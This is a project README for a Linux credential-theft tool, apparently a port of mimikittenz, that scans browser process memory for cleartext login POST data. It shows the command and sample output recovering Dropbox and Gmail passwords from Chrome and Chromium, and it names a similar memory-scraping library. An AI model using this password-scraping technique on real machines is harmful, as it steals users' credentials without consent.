# mimikittenz4Linux

Many web browsers persists cleartext POST requests in memory far after the request is made. This can be abused to steal cleartext passwords out of memory following login requests.

The [mimikittenz project](https://github.com/putterpanda/mimikittenz) demonstrates extracting cleartext passwords out of memory from a running browser in a Windows system. This tool does the same thing for Linux systems. The regexes are taken directoy from the mimikittenz project

## Example

```
sudo mimikittenz.py
Found chrome running, scanning....
PID = 19789
PID = 19800
PID = 19801
PID = 19804
PID = 19853
PID = 19908
PID = 20329
PID = 21041
Found service Dropbox: ['login_email=somedudesemail%40gmail.com&login_password=thisisasecretpassword&remember_me=True&', 'login_email=somedudesemail%40gmail.com&login_password=thisisasecretpassword&remember_me=True&', 'login_email=somedudesemail%40gmail.com&login_password=thisisasecretpassword&remember_me=True&']
Found chromium running, scanning....
PID = 17497
PID = 17531
PID = 18653
PID = 20757
PID = 27493
PID = 27502
PID = 27504
PID = 27565
PID = 27655
PID = 27683
Found service Gmail: ['&Email=somedudesemail&Passwd=someOTHERsecretpassword&PersistentCookie=']
Found firefox running, scanning....
PID = 3810
PID = 3872
```

## Extra considerations

Though this tool is designed to extract query parameters from POST requests, as Single Page Apps become more popular, it is likely password variables will persist, due to developers not deleting them following login requests. These services will be exploitable using simaliar methods to the ones shown in this tool.

## Don't use my tool, use this other one

This tool https://github.com/n1nj4sec/memorpy is one I descovered after making mimikittenz4Linux. One of it's examples does functionally the same thing as this tool, with a few extra features. 
